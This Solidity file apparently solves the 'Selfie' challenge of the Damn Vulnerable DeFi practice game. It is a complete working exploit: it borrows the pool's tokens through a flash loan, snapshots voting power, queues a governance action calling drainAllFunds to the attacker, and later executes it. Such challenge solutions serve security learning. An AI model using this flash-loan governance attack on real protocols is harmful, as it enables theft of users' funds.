// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './SimpleGovernance.sol';
import './SelfiePool.sol';
import '../DamnValuableTokenSnapshot.sol';

/**
 * @title SelfiePoolDrainer
 * @author Patate
 */
contract SelfiePoolDrainer {
    address public immutable owner;
    SimpleGovernance public immutable simpleGovernance;
    SelfiePool public immutable selfiePool;
    DamnValuableTokenSnapshot public immutable damnValuableTokenSnapshot;

    uint256 public actionId;

    constructor(
        SimpleGovernance _simpleGovernance,
        SelfiePool _selfiePool,
        DamnValuableTokenSnapshot _damnValuableTokenSnapshot
    ) {
        owner = msg.sender;
        simpleGovernance = _simpleGovernance;
        selfiePool = _selfiePool;
        damnValuableTokenSnapshot = _damnValuableTokenSnapshot;
    }

    function queueDrainProposal() external {
        selfiePool.flashLoan(damnValuableTokenSnapshot.balanceOf(address(selfiePool)));
    }

    function receiveTokens(address _token, uint256 _amount) external {
        DamnValuableTokenSnapshot(_token).snapshot();
        actionId = simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSelector(SelfiePool.drainAllFunds.selector, owner),
            0
        );
        DamnValuableTokenSnapshot(_token).transfer(address(selfiePool), _amount);
    }

    function drain() external payable {
        simpleGovernance.executeAction(actionId);
    }
}
